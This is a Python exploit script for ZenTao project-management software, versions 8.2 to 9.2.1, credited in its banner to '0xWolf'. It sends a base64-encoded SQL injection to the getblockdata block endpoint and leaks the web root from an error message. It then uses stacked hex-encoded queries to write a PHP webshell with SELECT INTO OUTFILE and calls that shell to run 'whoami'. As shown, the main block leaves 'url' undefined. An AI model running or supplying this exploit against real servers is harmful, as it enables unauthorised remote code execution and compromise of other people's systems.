# coding=utf-8

import requests
import base64
import re
import json
import time


banner = '''
 ________   _______ .__   __.       .___________.    ___       ______   
|       /  |   ____||  \ |  |       |           |   /   \     /  __  \  
`---/  /   |  |__   |   \|  |       `---|  |----`  /  ^  \   |  |  |  | 
   /  /    |   __|  |  . `  |           |  |      /  /_\  \  |  |  |  |     
  /  /----.|  |____ |  |\   |           |  |     /  _____  \ |  `--'  | 
 /________||_______||__| \__|           |__|    /__/     \__\ \______/  
                                                                                                                                                
                    v8.2 - 9.2.1 RCE

                      python3 by 0xWolf

    usage: python3 exp.py http://127.0.0.1:80/zentao                                                                                                                                                                                     
'''
print(banner)

def get_web_dir(url,filename):
    if url[-1] == '/':
        url = url[:-1]
    else:
        url = url

    payload = '''{"orderBy":"order limit 1,1'","num":"1,1","type":"openedbyme"}'''
    base64encode_str = base64.b64encode(payload.encode()).decode("utf-8")
    web_dir = url + "/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=" + base64encode_str
    version_url = url + "/zentao/index.php?mode=getconfig"
    r0 = requests.get(url=version_url)
    json_str = json.loads(r0.text)
    print("Cuurent Version= " + json_str['version'])

    headers = {
    "Referer":url,
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
    }

    r= requests.get(url=web_dir, headers=headers)
    
    if r.status_code==200 and 'SELECT' in r.content.decode():
        # print('\n')
        # print(r.content.decode())
        m = re.compile(r'.*in <strong>(.*)</strong> on')
        www_dir = m.findall(r.content.decode())
        www_root = www_dir[0].replace('\\', "//")
        # print(www_root)
        m = re.compile(r'(.*)framework',re.DOTALL)
        get_shell = """select '<?php system("whoami");?>' into outfile '%s'""" % (m.findall(www_root)[0] + 'www//' + filename)
        print('\n%s\n' % get_shell)
        hex_str = get_shell.encode().hex()
        payload1 = '''{"orderBy":"order limit 1;SET @SQL=0x%s;PREPARE pord FROM @SQL;EXECUTE pord;-- -","num":"1,1","type":"openedbyme"}''' % hex_str
        getshell_url = url + "/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=" + base64.b64encode(payload1.encode()).decode()

        headers = {
        "Referer":"%s/zentao"%url,
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
        }
        r1 = requests.get(url=getshell_url,headers=headers)
        if r1.status_code == 200 and 'ID' in r1.content.decode():
            # print(getshell_url)

            webshell = url + "/zentao/" + filename
            r2 = requests.get(url=webshell)
            if r2.status_code == 200:
                print("Webshell locating: %s" % webshell)
                r3 = requests.get(webshell).content
                print("\n" + "whoami:\t" + r3.decode("GB2312"))
            else:
                print("No Webshell Exit!")
        else:
            print("No Send Success into file!")

    else:
        print("No Exit!")


if __name__ == "__main__":
    # url = "http://127.0.0.1:80"
    # url = sys.argv[1]
    filename = str(time.time()).replace(".","1") + ".php"
    get_web_dir(url,filename)
